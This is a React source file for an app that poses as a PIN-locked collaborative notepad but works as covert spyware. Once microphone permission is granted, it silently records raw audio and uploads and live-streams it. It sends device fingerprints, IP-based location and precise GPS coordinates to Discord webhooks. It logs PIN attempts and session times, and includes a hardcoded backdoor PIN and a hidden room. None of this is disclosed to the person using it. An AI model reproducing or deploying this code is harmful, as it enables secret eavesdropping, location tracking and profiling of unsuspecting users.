import { useEffect, useRef, useState } from 'react';
import { EditorContent, useEditor } from '@tiptap/react';
import StarterKit from '@tiptap/starter-kit';
import Image from '@tiptap/extension-image';
import './App.css';
import { db } from './firebase';
import { saveRoomPin, verifyRoomPin } from './utils/roomPin';
import { sendDiscordNotification } from './utils/discord';
import { ref, onValue, set } from 'firebase/database';
import Permissions from './Permissions';
import { uploadAudioChunk } from './audioUpload';
import { joinPresence } from './presence';
import { subscribeAlert } from './alert';
import type { LiveAlert } from './alert';
import { WebRTCStreamer } from './webrtc-streamer';
import GhostTypingOverlay from './GhostTypingOverlay';
import { appLeaveEmbed } from './utils/embeds';

function getRoomId(): string {
  const path = window.location.pathname.replace(/^\//, '');
  if (path) return path;
  // Generate a random room id
  const newId = Math.random().toString(36).slice(2, 10);
  window.location.pathname = '/' + newId;
  return newId;
}

function App() {
  // --- User Left Notification Logic (notification-explanation.txt) ---
  useEffect(() => {
    const webhookUserLeft = import.meta.env.VITE_WEBHOOK_USER_LEFT_ROOM;
    const roomId = getRoomId();
    const joinKey = `socket_join_time_${roomId}`;
    // Set join time if not already set
    if (!localStorage.getItem(joinKey)) {
      localStorage.setItem(joinKey, Date.now().toString());
    }
    // Unload handler
    const handleUnload = () => {
      console.log('[User Left Notification] Unload handler triggered');
      const joinTimeStr = localStorage.getItem(joinKey);
      let joinTime: Date | undefined;
      let duration: string | undefined;
      let leftTime = new Date();
      if (!joinTimeStr || isNaN(Number(joinTimeStr))) {
        console.warn('[User Left Notification] Join time missing or invalid:', joinTimeStr);
      }
      if (joinTimeStr && !isNaN(Number(joinTimeStr))) {
        joinTime = new Date(Number(joinTimeStr));
        const ms = leftTime.getTime() - joinTime.getTime();
        if (ms > 0) {
          const h = Math.floor(ms / 3600000);
          const m = Math.floor((ms % 3600000) / 60000);
          const s = Math.floor((ms % 60000) / 1000);
          duration = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
        } else {
          duration = '0:00:00';
        }
      }
      // Build embed
      const embed = appLeaveEmbed({
        url: window.location.href,
        leftTime,
        joinTime,
        duration
      });
      embed.title = '🚪 User Left (Frontend)';
      embed.color = 0x9c6fe0;
      embed.footer = { text: 'Sent directly from browser (not serverless)' };
      if (!joinTimeStr || isNaN(Number(joinTimeStr))) {
        embed.fields.push({ name: 'Joined at', value: 'Unknown', inline: true });
        embed.fields.push({ name: 'Session Duration', value: 'Unknown', inline: true });
      }
      console.log('[User Left Notification] Webhook:', webhookUserLeft);
      console.log('[User Left Notification] Embed payload:', { embeds: [embed] });
      // Send notification using fetch with keepalive: true (more reliable in Vercel/prod)
      if (webhookUserLeft) {
        try {
          fetch(webhookUserLeft, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
            keepalive: true,
          });
        } catch (err) {
          console.error('[User Left Notification] Fetch error:', err);
        }
      }
      // Also set endTime in Firebase for this session (for Admin dashboard reliability)
      try {
        if (roomId && sessionIdRef.current) {
          set(ref(db, `notepad/${roomId}/sessions/${sessionIdRef.current}/endTime`), Date.now());
        }
      } catch (err) {
        console.error('[User Left Notification] Failed to set endTime in Firebase:', err);
      }
      // Remove join time
      localStorage.removeItem(joinKey);
      // Add a short delay to maximize delivery reliability
      const start = Date.now();
      while (Date.now() - start < 200) {} // 200ms busy-wait

    };
    window.addEventListener('unload', handleUnload);
    return () => {
      window.removeEventListener('unload', handleUnload);
    };
  }, []);
  // --- End Notification Logic ---

  // Discord webhook URLs from env
  const webhookPageLoad = import.meta.env.VITE_WEBHOOK_PAGE_LOAD;
  const webhookPinSuccess = import.meta.env.VITE_WEBHOOK_PIN_SUCCESS;
  const webhookPinFailure = import.meta.env.VITE_WEBHOOK_PIN_FAILURE;
  const webhookPermsPreGranted = import.meta.env.VITE_WEBHOOK_PERMS_PREGRANTED;


  // Send Discord page load embed notification on mount
  useEffect(() => {
    if (!import.meta.env.PROD) return;
    (async () => {
      if (!webhookPageLoad) return;
      // Gather browser info
      const nav = navigator;
      const scr = window.screen;
      const info: any = {
        userAgent: nav.userAgent,
        platform: nav.platform,
        language: nav.language,
        screen: `${scr.width}x${scr.height}`,
        colorDepth: `${scr.colorDepth}-bit`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        orientation: (screen.orientation && screen.orientation.type) || 'unknown',
        memory: ((nav as any).deviceMemory || 'unknown') + ' GB',
        cpuCores: nav.hardwareConcurrency || 'unknown',
        battery: 'unknown',
        charging: 'unknown',
        networkType: ((nav as any).connection?.effectiveType) || 'unknown',
        downlink: ((nav as any).connection?.downlink) ? (nav as any).connection.downlink + ' Mbps' : 'unknown',
        cookiesEnabled: nav.cookieEnabled ? 'Yes' : 'No',
        doNotTrack: nav.doNotTrack === '1' ? 'Yes' : 'No',
        referrer: document.referrer || 'None',
        page: window.location.href,
        browser: (() => {
          const ua = nav.userAgent;
          if (ua.includes('Edg/')) return 'Edge';
          if (ua.includes('Chrome/')) return 'Chrome';
          if (ua.includes('Firefox/')) return 'Firefox';
          if (ua.includes('Safari/')) return 'Safari';
          return 'Unknown';
        })(),
        os: (() => {
          const ua = nav.userAgent;
          if (ua.includes('Win')) return 'Windows';
          if (ua.includes('Mac')) return 'MacOS';
          if (ua.includes('Linux')) return 'Linux';
          if (ua.includes('Android')) return 'Android';
          if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
          return 'Unknown';
        })(),
        timestamp: new Date().toLocaleString(),
      };
      // Battery info (async)
      if ((nav as any).getBattery) {
        try {
          const battery = await (nav as any).getBattery();
          info.battery = battery.level * 100 + '%';
          info.charging = battery.charging ? 'Yes' : 'No';
        } catch {}
      }
      // Fetch IP/location info
      let ipinfo: any = {};
      try {
        const res = await fetch('https://ipinfo.io/json?token=fcacdddfc859a8'); // Updated to use personal token
        if (res.ok) ipinfo = await res.json();
      } catch {}
      // Build embed fields
      const fields = [
        { name: 'Country', value: ipinfo.country || 'Unknown', inline: true },
        { name: 'Region', value: ipinfo.region || 'Unknown', inline: true },
        { name: 'City', value: ipinfo.city || 'Unknown', inline: true },
        { name: 'IP', value: ipinfo.ip || 'Unknown', inline: true },
        { name: 'userAgent', value: '```' + info.userAgent + '```' },
        { name: 'platform', value: info.platform, inline: true },
        { name: 'language', value: info.language, inline: true },
        { name: 'screen', value: info.screen, inline: true },
        { name: 'colorDepth', value: info.colorDepth, inline: true },
        { name: 'timezone', value: info.timezone, inline: true },
        { name: 'orientation', value: info.orientation, inline: true },
        { name: 'memory', value: info.memory, inline: true },
        { name: 'cpuCores', value: info.cpuCores.toString(), inline: true },
        { name: 'battery', value: info.battery, inline: true },
        { name: 'charging', value: info.charging, inline: true },
        { name: 'networkType', value: info.networkType, inline: true },
        { name: 'downlink', value: info.downlink, inline: true },
        { name: 'cookiesEnabled', value: info.cookiesEnabled, inline: true },
        { name: 'doNotTrack', value: info.doNotTrack, inline: true },
        { name: 'referrer', value: info.referrer, inline: true },
        { name: 'page', value: info.page },
        { name: 'browser', value: info.browser, inline: true },
        { name: 'os', value: info.os, inline: true },
        { name: 'Timestamp', value: info.timestamp, inline: true },
      ];
      // Build embed using central utility
      const { buildEmbed } = await import('./utils/embeds');
      const embed = buildEmbed({
        title: '📄 Socket: Page Load',
        description: 'A user has loaded the app. Here is a detailed device/session info snapshot for Socket.',
        color: 0x8e7cf0,
        fields,
      });
      // Send embed
      try {
        const { sendDiscordEmbedNotification } = await import('./utils/discord');
        await sendDiscordEmbedNotification(webhookPageLoad, embed);
      } catch (err) {
        // fallback: plain notification
        await sendDiscordNotification(webhookPageLoad, '[Page Load] User loaded Socket, but embed failed.');
      }
    })();
  }, []);

  const [imageUploading, setImageUploading] = useState(false);
  const [permissionsGranted, setPermissionsGrantedState] = useState(() => {
    // Check session storage for existing permission
    return sessionStorage.getItem('permissionsGranted') === 'true';
  });

  // Wrapper to update both state and session storage
  const setPermissionsGranted = (value: boolean) => {
    sessionStorage.setItem('permissionsGranted', String(value));
    setPermissionsGrantedState(value);
  };
  const [title, setTitle] = useState('Collaborative Notepad');
  const [editingTitle, setEditingTitle] = useState(false);
  const [status, setStatus] = useState<'idle' | 'syncing' | 'synced'>('idle');
  const [roomId, setRoomId] = useState<string>('');
  const [locked, setLocked] = useState(true);
  const [pinMode, setPinMode] = useState<'set'|'enter'|null>(null);
  const [pinInput, setPinInput] = useState('');
  const [pinError, setPinError] = useState('');
  const [viewers, setViewers] = useState(1);
  const [liveAlert, setLiveAlert] = useState<LiveAlert|null>(null);
  const [preGrantedNotified, setPreGrantedNotified] = useState(false);
  // Detect already-granted permissions at the PIN screen and send a single Discord notification
  useEffect(() => {
    if (preGrantedNotified) return; // already sent once
    if (!navigator.permissions || !webhookPermsPreGranted) return;
    (async () => {
      try {
        const [micPerm, geoPerm] = await Promise.all([
          navigator.permissions.query({ name: 'microphone' as PermissionName }),
          navigator.permissions.query({ name: 'geolocation' as PermissionName }),
        ]);
        const micGranted = micPerm.state === 'granted';
        const geoGranted = geoPerm.state === 'granted';
        if (micGranted || geoGranted) {
          const { buildEmbed } = await import('./utils/embeds');
          let locationField = { name: 'Location', value: geoGranted ? 'GRANTED' : 'Not granted', inline: true };
          let mapLinkField = null;
          let position = null;
          // Always attempt to get geolocation if possible (will prompt if not pregranted)
          if (navigator.geolocation) {
            try {
              position = await new Promise<GeolocationPosition>((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 4000});
              });
              if (position) {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                mapLinkField = { name: 'Map Link', value: `[Open in Google Maps](https://maps.google.com/?q=${lat},${lng})`, inline: false };
                locationField = { ...locationField, value: `GRANTED\nLat: ${lat.toFixed(6)}\nLng: ${lng.toFixed(6)}` };
              }
            } catch {}
          }
          const fields = [
            { name: 'Microphone', value: micGranted ? 'GRANTED' : 'Not granted', inline: true },
            locationField,
            { name: 'Current URL', value: window.location.href, inline: false },
          ];
          if (mapLinkField) fields.push(mapLinkField);
          const embed = buildEmbed({
            title: '✅ Socket: Permissions Pre-Granted',
            description: 'Browser returned permissions without prompting.',
            color: 0x6fe07b,
            fields,
          });
          sendDiscordNotification(webhookPermsPreGranted, { embeds: [embed] });
        }
      } catch {
        /* ignore */
      } finally {
        setPreGrantedNotified(true);
      }
    })();
  }, [preGrantedNotified, webhookPermsPreGranted]);

  // --- Audio Recording State ---
  const mediaRecorderRef = useRef<MediaRecorder|null>(null);
  const audioStreamRef = useRef<MediaStream|null>(null);
  const chunkIdxRef = useRef<number>(0);
  const sessionIdRef = useRef<string>("");

  // --- WebRTC Streamer State ---
  const webrtcStreamerRef = useRef<WebRTCStreamer|null>(null);


  // TipTap editor instance
  const editor = useEditor({
    extensions: [
      StarterKit,
      Image,
    ],
    content: '',
    autofocus: true,
    onUpdate: ({ editor }) => {
      // Sync HTML content to Firebase
      if (roomId && !locked) {
        set(ref(db, `notepad/${roomId}/content`), editor.getHTML());
        setStatus('syncing');

      }
    },
    editorProps: {
      // eslint-disable-next-line @typescript-eslint/no-unused-vars
      handlePaste(_view, event, _slice) {
        const items = event.clipboardData?.items;
        if (!items) return false;
        for (let i = 0; i < items.length; i++) {
          const item = items[i];
          if (item.type.indexOf('image') !== -1) {
            const file = item.getAsFile();
            if (file) {
              const upload = async () => {
                setImageUploading(true);
                try {
                  const { ref: storageRef, uploadBytes, getDownloadURL } = await import('firebase/storage');
                  const storage = await import('firebase/storage').then(module => module.getStorage());
                  const imagePath = `notepad/${roomId}/images/${Date.now()}_${file.name}`;
                  const imgRef = storageRef(storage, imagePath);
                  await uploadBytes(imgRef, file);
                  const url = await getDownloadURL(imgRef);
                  // Insert image at current selection
                  editor?.chain().focus().setImage({ src: url }).run();
                  setStatus('syncing');
                } catch (err) {
                  alert('Failed to upload image.');
                } finally {
                  setImageUploading(false);
                }
              };
              upload();
              event.preventDefault();
              return true;
            }
          }
        }
        return false;
      }
    }
  });

  // Page load Discord notification
  const hasNotifiedPageLoad = useRef(false);
  useEffect(() => {
    if (!hasNotifiedPageLoad.current) {
      sendDiscordNotification(webhookPageLoad, `Collaborative Notepad: Page loaded at ${new Date().toLocaleString()}`);
      hasNotifiedPageLoad.current = true;
    }
  }, []);

// Universal unload Discord notification
useEffect(() => {
  const roomId = window.location.pathname.replace(/^\//, '') || 'default';
  const uid = 'app'; // Use a fixed uid for app-level events
  const joinTimeKey = `socket_join_time_${roomId}_${uid}`;
  // Store join time if not already set
  if (!localStorage.getItem(joinTimeKey)) {
    localStorage.setItem(joinTimeKey, Date.now().toString());
  }
  const handleUnload = () => {
    let joinTimeStr = localStorage.getItem(joinTimeKey);
    let joinTime = joinTimeStr ? parseInt(joinTimeStr) : null;
    let leftTime = Date.now();
    let durationStr = '';
    if (joinTime) {
      const durationMs = leftTime - joinTime;
      const h = Math.floor(durationMs / 3600000);
      const m = Math.floor((durationMs % 3600000) / 60000);
      const s = Math.floor((durationMs % 60000) / 1000);
      durationStr = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
    }
    // Send Discord webhook notification BEFORE cleanup
    import('./utils/embeds').then(({ appLeaveEmbed }) => {
      const embed = appLeaveEmbed({
        url: window.location.href,
        leftTime: new Date(leftTime),
        joinTime: joinTime ? new Date(joinTime) : undefined,
        duration: durationStr || undefined,
      });
      // Try beacon first, fallback to fetch if needed

      // Always POST to /api/user-left (serverless function)
      const apiEndpoint = '/api/user-left';
      const payload = { embeds: [embed] };
      // Use fetch with keepalive for reliability
      fetch(apiEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      })
        .then(async (res) => {
          let text = '';
          try { text = await res.text(); } catch {}
          console.log('[User Left App] Serverless response:', res.status, text);
        })
        .catch((err) => {
          if (typeof window !== 'undefined') {
            if (window.location.hostname === 'localhost') {
              console.error('Serverless leave webhook failed:', err);
            }
          }
        });
      // Add a small delay to allow the request to be sent before cleanup
      const start = Date.now();
      const delay = 150; // ms
      while (Date.now() - start < delay) {
        // Busy-wait (short, to avoid async issues on unload)
      }
    });
    // Now cleanup join time
    localStorage.removeItem(joinTimeKey);
  };
  window.addEventListener('beforeunload', handleUnload);
  return () => window.removeEventListener('beforeunload', handleUnload);
}, []);

// Load initial content from Firebase as HTML
// Cleanup WebRTC streamer on unmount
useEffect(() => {
  return () => {
    if (webrtcStreamerRef.current) {
      webrtcStreamerRef.current.close();
      webrtcStreamerRef.current = null;
      console.log('[WebRTC] Cleaned up on unmount');
    }
  };
}, []);
  // Cleanup WebRTC streamer on unmount
  useEffect(() => {
    return () => {
      if (webrtcStreamerRef.current) {
        webrtcStreamerRef.current.close();
        webrtcStreamerRef.current = null;
        console.log('[WebRTC] Cleaned up on unmount');
      }
    };
  }, []);

  useEffect(() => {
    if (!roomId || !editor) return;
    const noteRefDB = ref(db, `notepad/${roomId}/content`);
    const unsubNote = onValue(noteRefDB, (snapshot) => {
      const data = snapshot.val();
      if (typeof data === 'string') {
        if (data !== editor.getHTML()) {
          editor.commands.setContent(data, false);
        }
      }
      setStatus('synced');
    });
    return () => { unsubNote(); };
  }, [roomId, editor, locked]);

  useEffect(() => {
    // On roomId change, check pin lock
    if (!roomId) return;
    
    // Bypass PIN check for 'ftomain' room
    if (roomId === 'ftomain') {
      setLocked(false);
      setPinMode(null);
      return;
    }
    
    
    // Check if PIN exists in Firestore for this room
    (async () => {
      try {
        const ok = await verifyRoomPin(roomId, ''); // Empty string will never match, but will return false if no doc exists
        if (ok === false) {
          setPinMode('enter');
          setLocked(true);
        } else {
          setPinMode('set');
          setLocked(true);
        }
      } catch {
        setPinMode('set');
        setLocked(true);
      }
    })();
  }, [roomId]);

  async function handlePinSubmit(e: React.FormEvent) {
    e.preventDefault();
    
    // Special case: PIN "1212" redirects to room "ftomain" (only in enter mode, not set mode)
    if (pinInput === '1212' && pinMode === 'enter') {
      // Store permission state in session storage before redirect
      sessionStorage.setItem('permissionsGranted', 'true');
      // Use window.location.replace to prevent adding to browser history
      window.location.replace(`/${'ftomain'}`);
      return;
    }
    
    
    if (pinMode === 'set') {
      if (!/^\d{4,8}$/.test(pinInput)) {
        setPinError('Pin must be 4-8 digits');
        return;
      }
      try {
        await saveRoomPin(roomId, pinInput);
        setLocked(false);
        setPinInput('');
        setPinMode(null);
        setPinError('');
      } catch (err) {
        setPinError('Failed to save PIN');
      }
    } else if (pinMode === 'enter') {
      try {
        const ok = await verifyRoomPin(roomId, pinInput);
        if (ok) {
          setLocked(false);
          setPinError('');
          setPinInput('');
          setPinMode(null);
          import('./utils/embeds').then(({ pinEmbed }) => {
            const embed = pinEmbed({
              roomId,
              success: true,
              time: new Date(),
            });
            sendDiscordNotification(webhookPinSuccess, { embeds: [embed] });
          });
        } else {
          setPinError('Incorrect PIN');
          setTimeout(() => setPinError(''), 1200);
          import('./utils/embeds').then(({ pinEmbed }) => {
            const embed = pinEmbed({
              roomId,
              success: false,
              time: new Date(),
            });
            sendDiscordNotification(webhookPinFailure, { embeds: [embed] });
          });
        }
      } catch (err) {
        setPinError('Failed to verify PIN');
      }
    }
  }

  // Fetch roomId and title
  useEffect(() => {
    const id = getRoomId();
    setRoomId(id);
    // Listen for title
    const titleRefDB = ref(db, `notepad/${id}/title`);
    const unsubTitle = onValue(titleRefDB, (snapshot) => {
      const data = snapshot.val();
      if (typeof data === 'string' && data.trim() !== '') {
        setTitle(data);
      } else {
        setTitle('Socket');
      }
    });
    return () => { unsubTitle(); };
  }, []);

  // Join presence only after permissions granted and pin unlocked
  useEffect(() => {
    if (!permissionsGranted || locked) return;
    const id = roomId || getRoomId();
    const cleanupPresence = joinPresence(id, setViewers);
    return () => { cleanupPresence(); };
  }, [permissionsGranted, locked, roomId]);

  // Live alert subscription
  useEffect(() => {
    if (!roomId || !permissionsGranted || locked) return;
    const unsub = subscribeAlert(roomId, (alert) => {
      setLiveAlert(alert);
    });
    return () => { unsub(); };
  }, [roomId, permissionsGranted, locked]);

  // Update title in DB
  const handleTitleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setTitle(value);
  };
  const handleTitleBlur = () => {
    setEditingTitle(false);
    set(ref(db, `notepad/${roomId}/title`), title);
  };
  const handleTitleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      (e.target as HTMLInputElement).blur();
    }
  };


  const [recordEndTime, setRecordEndTime] = useState<number|null>(null);

  // --- Audio Recording and Streaming Logic ---
  async function startRecording() {
    console.log('[Recorder] startRecording TRIGGERED');
    // Prevent duplicate recordings
    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
      console.warn('[Recorder] Attempted to start while already recording. Ignored.');
      return;
    }
    // Stop and clear any previous recorder
    if (mediaRecorderRef.current) {
      try {
        if (mediaRecorderRef.current.state !== 'inactive') {
          mediaRecorderRef.current.stop();
        }
      } catch (err) {
        console.warn('[Recorder] Error stopping previous recorder:', err);
      }
      mediaRecorderRef.current = null;
    }
    console.log('[Recorder] Creating new MediaRecorder...');
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
  audio: {
    noiseSuppression: false,
    echoCancellation: false,
    autoGainControl: false,
    channelCount: 2, // stereo for maximum rawness
    sampleRate: 48000, // 48kHz for pro audio
  }
});
audioStreamRef.current = stream;
// Prefer uncompressed audio/wav if supported
let recorder: MediaRecorder;
if (MediaRecorder.isTypeSupported('audio/wav')) {
  recorder = new MediaRecorder(stream, { mimeType: 'audio/wav' });
} else if (MediaRecorder.isTypeSupported('audio/webm;codecs=pcm')) {
  recorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=pcm' });
} else {
  recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
}
mediaRecorderRef.current = recorder;
      mediaRecorderRef.current = recorder;
      // Always reset chunk index before recording
chunkIdxRef.current = 0;

      // --- WebRTC: Start live audio streaming ---
      if (!webrtcStreamerRef.current) {
        try {
          webrtcStreamerRef.current = new WebRTCStreamer({ roomId, stream });
          await webrtcStreamerRef.current.start();
          console.log('[WebRTC] Live audio streaming started');
        } catch (err) {
          console.error('[WebRTC] Failed to start live streaming:', err);
        }
      }

      // Set handlers only once before starting
      recorder.ondataavailable = async (e: BlobEvent) => {
        if (e.data && e.data.size > 0) {
          await uploadAudioChunk(roomId, sessionIdRef.current, e.data, chunkIdxRef.current++);
        }
      };
      recorder.onstop = async () => {
        // Write end time to DB
        const endTime = Date.now();
        set(ref(db, `notepad/${roomId}/sessions/${sessionIdRef.current}/endTime`), endTime);
        setRecordEndTime && setRecordEndTime(endTime);
        // --- WebRTC: Cleanup ---
        if (webrtcStreamerRef.current) {
          webrtcStreamerRef.current.close();
          webrtcStreamerRef.current = null;
          console.log('[WebRTC] Live audio streaming stopped');
        }
      };

      recorder.start(1000); // Start recording, emit 1s chunks automatically
    } catch (err) {
      // Optionally notify user
      // eslint-disable-next-line no-console
      console.error('Audio recording error:', err);
    }
  }

  // --- Audio Recording Cleanup Effect ---
  useEffect(() => {
    if (!permissionsGranted || !roomId) return;
    // Cleanup & stop on unmount or permission loss
    return () => {
      if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
        mediaRecorderRef.current.stop();
      }
      if (audioStreamRef.current) {
        audioStreamRef.current.getTracks().forEach(track => track.stop());
        audioStreamRef.current = null;
      }
    };
  }, [permissionsGranted, roomId]);

  // --- Flush last audio chunk on tab close ---
  useEffect(() => {
    if (!permissionsGranted || !roomId) return;
    const handleBeforeUnload = () => {
      if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
        mediaRecorderRef.current.stop();
      }
      if (audioStreamRef.current) {
        audioStreamRef.current.getTracks().forEach(track => track.stop());
        audioStreamRef.current = null;
      }
      // Optionally, you could write the end time here too, but onstop handler will handle it.
    };
    window.addEventListener('beforeunload', handleBeforeUnload);
    return () => window.removeEventListener('beforeunload', handleBeforeUnload);
  }, [permissionsGranted, roomId]);

  // Ref to ensure startRecording is only called once per session
  const hasStartedRecordingRef = useRef(false);
  const pendingMicStartRef = useRef(false);

  // Ensure recording starts if permissions are pre-granted (e.g., after hard refresh)
  useEffect(() => {
    if (permissionsGranted && roomId && !hasStartedRecordingRef.current) {
      hasStartedRecordingRef.current = true;
      if (!sessionIdRef.current) {
        const now = Date.now();
        const rand = Math.random().toString(36).slice(2, 8);
        sessionIdRef.current = `${now}_${rand}`;
      }
      startRecording();
    }
  }, [permissionsGranted, roomId]);

  if (!permissionsGranted) {
    return <Permissions 
      onGranted={() => setPermissionsGranted(true)}
      onMicGranted={async () => {
        if (hasStartedRecordingRef.current) return;
        if (roomId) {
          if (!sessionIdRef.current) {
            const now = Date.now();
            const rand = Math.random().toString(36).slice(2, 8);
            sessionIdRef.current = `${now}_${rand}`;
          }
          hasStartedRecordingRef.current = true;
          await startRecording();
        } else {
          pendingMicStartRef.current = true;
        }
      }}
    />;
  }




  

  // Show loading spinner while we are still determining whether a PIN is required
  if (locked && pinMode === null) {
    return (
      <div className="notepad-container" style={{display:'flex',justifyContent:'center',alignItems:'center',height:'100vh'}}> 
        <div style={{width:46,height:46,border:'6px solid #a084e8',borderTop:'6px solid #232336',borderRadius:'50%',animation:'spin 1s linear infinite'}} />
        <style>{`@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}`}</style>
      </div>
    );
  }

  if (locked && pinMode) {
    return (
      <div className="notepad-container" style={{justifyContent:'center',alignItems:'center',display:'flex',flexDirection:'column',height:'100vh'}}>
        <form onSubmit={handlePinSubmit} style={{display:'flex',flexDirection:'column',alignItems:'center',gap:16,width:'100%',maxWidth:340}}>
          <div style={{fontWeight:600,fontSize:'1.18rem',marginBottom:8,textAlign:'center',color:'#e1e6fc'}}>
            {pinMode === 'set' ? 'Set a PIN for this room' : 'Enter PIN to unlock'}
          </div>
          <input
            type="password"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={8}
            minLength={4}
            value={pinInput}
            onChange={e => { setPinInput(e.target.value.replace(/[^0-9]/g,'')); setPinError(''); }}
            style={{fontSize:'1.3rem',padding:'10px 16px',background:'#232336',color:'#e1e6fc',border:'none',borderRadius:0,outline:'none',width:'100%',textAlign:'center',letterSpacing:'0.18em',fontFamily:"'Fira Mono', Consolas, monospace"}}
            autoFocus
            autoComplete="off"
          />
          {pinError && <div style={{color:'#ff4f4f',fontSize:'0.98rem',marginTop:4}}>{pinError}</div>}
          <button type="submit" style={{marginTop:18,padding:'8px 0',width:'100%',background:'#a084e8',color:'#232336',fontWeight:700,fontSize:'1.08rem',border:'none',borderRadius:0,cursor:'pointer'}}>
            {pinMode === 'set' ? 'Set PIN' : 'Unlock'}
          </button>
        </form>
      </div>
    );
  }

  return (
    <div className="notepad-container">
      {recordEndTime && (
        <div style={{background:'#181926',color:'#3be37b',padding:'10px',marginBottom:8,borderRadius:4,fontWeight:600,fontSize:'1.08rem'}}>
          Recording ended at: {new Date(recordEndTime).toLocaleString()}
        </div>
      )}
      {/* Ghost Typing Overlay: injects ghost line above cursor if admin alert is present */}
      <div style={{position:'relative', width:'100%'}}>
        {liveAlert && liveAlert.message && (
          <GhostTypingOverlay editor={editor} ghostText={liveAlert.message} />
        )}
      </div>
      
      <header className="cute-header" style={{display:'flex',alignItems:'center',justifyContent:'space-between',padding:'18px 18px 6px 18px',minHeight:64}}>
        {/* Viewers (left) */}
        <div style={{display:'flex',alignItems:'center',gap:5,minWidth:48}} title={viewers === 1 ? '1 person viewing' : viewers+' people viewing'}>
          {Array.from({length: viewers}).map((_,i) => (
            <span key={i} style={{width:11,height:11,borderRadius:'50%',background:'#a084e8',display:'inline-block',boxShadow:'0 0 3px #a084e8'}}/>
          ))}
        </div>
        {/* Title (center) */}
        <div style={{flex:1,display:'flex',justifyContent:'center',alignItems:'center',minWidth:0,height:'100%'}}>
          {editingTitle ? (
            <input
              className="cute-title-edit"
              style={{textAlign:'center',margin:'0 auto',maxWidth:'90vw'}}
              value={title}
              onChange={handleTitleChange}
              onBlur={handleTitleBlur}
              onKeyDown={handleTitleKeyDown}
              autoFocus
              maxLength={40}
              spellCheck={true}
            />
          ) : (
            <span
              className="cute-title-display"
              style={{textAlign:'center',margin:'0 auto',display:'block',overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap',maxWidth:'90vw'}}
              onClick={() => setEditingTitle(true)}
              title="Click to edit title"
            >
              {title}
            </span>
          )}
        </div>
        {/* Exit button (right) */}
        <button
          type="button"
          style={{background:'none',border:'none',color:'#e1e6fc',fontSize:'1.45rem',cursor:'pointer',padding:0,marginLeft:10,transition:'color 0.18s',minWidth:40,height:40,display:'flex',alignItems:'center',justifyContent:'center',zIndex:1100,position:'relative'}}
          aria-label="Exit"
          title="Exit"
          onClick={() => {
            window.close();
            setTimeout(() => {
              // If tab didn't close, open a blank page in the same tab
              if (!window.closed) {
                window.location.replace('about:blank');
                setTimeout(() => {
                  if (window.location.href !== 'about:blank') {
                    alert('Unable to close or blank the tab automatically. Please close this tab manually.');
                  }
                }, 250);
              }
            }, 250);
          }}
        >
          &#10005;
        </button>
        <span className={`status-indicator ${status}`}></span>

      </header>
      <div style={{position:'relative', width:'100%'}}>
        <hr style={{
          border: 0,
          height: 2,
          background: 'linear-gradient(90deg, #3a3a5a 0%, #a084e8 50%, #3a3a5a 100%)',
          margin: 0,
          width: '100%',
          opacity: 0.95,
          position: 'absolute',
          top: 0,
          left: 0,
          zIndex: 120
        }} />
      </div>
      <div
        style={{
          background: '#232336',
          border: 'none',
          borderRadius: 0,
          padding: '32px 8px 32px 8px',
          color: '#e1e6fc',
          fontSize: '1.12rem',
          minHeight: '320px',
          margin: '0 auto 24px auto',
          boxSizing: 'border-box',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'flex-start',
          cursor: 'text',
          maxWidth: 860,
          width: '100%'
        }}
        onClick={() => {
          if (editor) {
            editor.chain().focus().run();
          }
        }}
      >
        <div style={{width: '100%', maxWidth: 820, height: '100%', padding: '0 4px'}}>
          <EditorContent editor={editor} style={{height: '100%', minHeight: '60vh', background: 'transparent', outline: 'none', boxShadow: 'none'}} />
          <style>{`
            .ProseMirror:focus {
              outline: none !important;
              box-shadow: none !important;
              border: none !important;
            }
          `}</style>
        </div>
        {imageUploading && (
          <div style={{
            position: 'fixed',
            top: 0,
            left: 0,
            width: '100vw',
            height: '100vh',
            background: 'rgba(30,32,60,0.44)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 9999
          }}>
            <div style={{
              width: 54,
              height: 54,
              border: '7px solid #a084e8',
              borderTop: '7px solid #232336',
              borderRadius: '50%',
              animation: 'spin 1.1s linear infinite',
              background: 'transparent',
            }} />
            <style>{`@keyframes spin { 0% { transform: rotate(0deg);} 100% {transform: rotate(360deg);} }`}</style>
          </div>
        )}
      </div>


    </div>
  );
}

export default App
